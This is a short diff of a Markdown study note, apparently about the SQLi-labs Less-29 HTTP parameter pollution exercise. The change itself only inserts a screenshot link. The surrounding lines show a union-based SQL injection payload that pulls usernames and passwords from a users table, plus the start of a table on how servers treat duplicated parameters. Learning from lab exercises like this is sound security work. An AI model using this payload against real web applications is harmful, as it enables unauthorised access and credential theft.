@@ -93,7 +93,7 @@ function whitelist($input)
 ```
 ?id=1&id=-1' union select 1,group_concat(username,0x3a,password),3 from users--+
 ```
-
+![](99_Attachments/图片/Less-29/file-20260615202314677.png)
 ## 不同服务器的 HPP 行为
 
 | 服务器 | 重复参数处理 |
